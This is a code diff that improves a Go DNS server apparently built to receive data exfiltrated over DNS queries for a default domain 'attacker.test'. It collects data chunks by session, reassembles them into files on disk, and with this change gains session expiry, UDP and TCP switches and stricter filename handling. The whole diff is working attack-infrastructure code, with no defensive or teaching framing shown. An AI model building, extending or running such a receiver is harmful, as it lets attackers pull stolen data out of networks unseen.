@@ -20,11 +20,13 @@ import (
 )
 
 var (
-	domainFlag = flag.String("domain", "attacker.test", "")
-	outDir     = flag.String("out", "received", "")
-	port       = flag.Int("port", 5300, "")
-	maxChunks  = flag.Int("max-chunks", 20000, "")
-	maxBytes   = flag.Int("max-bytes", 50<<20, "")
+	domainFlag       = flag.String("domain", "attacker.test", "")
+	outDir           = flag.String("out", "received", "")
+	port             = flag.Int("port", 5300, "")
+	maxChunks        = flag.Int("max-chunks", 20000, "")
+	maxBytes         = flag.Int("max-bytes", 50<<20, "")
+	enableUDP        = flag.Bool("udp", true, "")
+	enableTCP        = flag.Bool("tcp", true, "")
 	progressLogEvery = 50
 )
 
@@ -34,6 +36,7 @@ type sessionStore struct {
 	bytes        map[string]int
 	expected     map[string]int
 	origFilename map[string]string
+	lastSeen     map[string]time.Time
 }
 
 func newStore() *sessionStore {
@@ -42,6 +45,7 @@ func newStore() *sessionStore {
 		bytes:        make(map[string]int),
 		expected:     make(map[string]int),
 		origFilename: make(map[string]string),
+		lastSeen:     make(map[string]time.Time),
 	}
 }
 
@@ -66,6 +70,7 @@ func (s *sessionStore) addChunk(session string, seq int, chunk string) error {
 				}
 			}
 		}
+		s.lastSeen[session] = time.Now()
 		return nil
 	}
 
@@ -74,6 +79,7 @@ func (s *sessionStore) addChunk(session string, seq int, chunk string) error {
 	}
 	s.chunks[session][seq] = chunk
 	s.bytes[session] += len(chunk)
+	s.lastSeen[session] = time.Now()
 	// log progress every N chunks
 	got := 0
 	for k := range s.chunks[session] {
@@ -104,14 +110,10 @@ func (s *sessionStore) shouldReconstruct(session string) bool {
 	if !ok || exp <= 0 {
 		return false
 	}
-	got := 0
-	if m, ok2 := s.chunks[session]; ok2 {
-		for k := range m {
-			if k == 0 {
-				continue
-			}
-			got++
-		}
+	m := s.chunks[session]
+	got := len(m) - 1
+	if got < 0 {
+		got = 0
 	}
 	return got >= exp
 }
@@ -170,7 +172,18 @@ func (s *sessionStore) reconstructAndWrite(session string) (string, error) {
 	var name string
 	if origName != "" {
 		// sanitize session and origName minimally
-		safeFn := strings.ReplaceAll(origName, "/", "_")
+		var b strings.Builder
+		for _, r := range origName {
+			if (r >= 'a' && r <= 'z') ||
+				(r >= 'A' && r <= 'Z') ||
+				(r >= '0' && r <= '9') ||
+				r == '.' || r == '-' || r == '_' {
+				b.WriteRune(r)
+			} else {
+				b.WriteByte('_')
+			}
+		}
+		safeFn := b.String()
 		name = fmt.Sprintf("%s/%s_%s.bin", *outDir, session, safeFn)
 	} else {
 		name = fmt.Sprintf("%s/%s_%d.bin", *outDir, session, time.Now().Unix())
@@ -279,19 +292,45 @@ func serveDNS(s *sessionStore, targetDomain string) {
 	serverUDP := &dns.Server{Addr: fmt.Sprintf(":%d", *port), Net: "udp", Handler: d}
 	serverTCP := &dns.Server{Addr: fmt.Sprintf(":%d", *port), Net: "tcp", Handler: d}
 
-	go func() {
-		if err := serverUDP.ListenAndServe(); err != nil {
-			log.Fatalf("failed udp: %v", err)
+	if *enableUDP {
+		go func() {
+			if err := serverUDP.ListenAndServe(); err != nil {
+				log.Fatalf("failed udp: %v", err)
+			}
+		}()
+	}
+
+	if *enableTCP {
+		if err := serverTCP.ListenAndServe(); err != nil {
+			log.Fatalf("failed tcp: %v", err)
 		}
-	}()
-	if err := serverTCP.ListenAndServe(); err != nil {
-		log.Fatalf("failed tcp: %v", err)
 	}
 }
 
 func main() {
 	flag.Parse()
 	store := newStore()
+
+	go func() {
+		ticker := time.NewTicker(1 * time.Minute)
+		defer ticker.Stop()
+		for range ticker.C {
+			cutoff := time.Now().Add(-10 * time.Minute)
+			store.mu.Lock()
+			for sess, t := range store.lastSeen {
+				if t.Before(cutoff) {
+					delete(store.chunks, sess)
+					delete(store.bytes, sess)
+					delete(store.expected, sess)
+					delete(store.origFilename, sess)
+					delete(store.lastSeen, sess)
+					log.Printf("session %s expired and cleaned", sess)
+				}
+			}
+			store.mu.Unlock()
+		}
+	}()
+
 	log.Printf("listening authoritative for %s on port %d", *domainFlag, *port)
 	serveDNS(store, *domainFlag)
 }
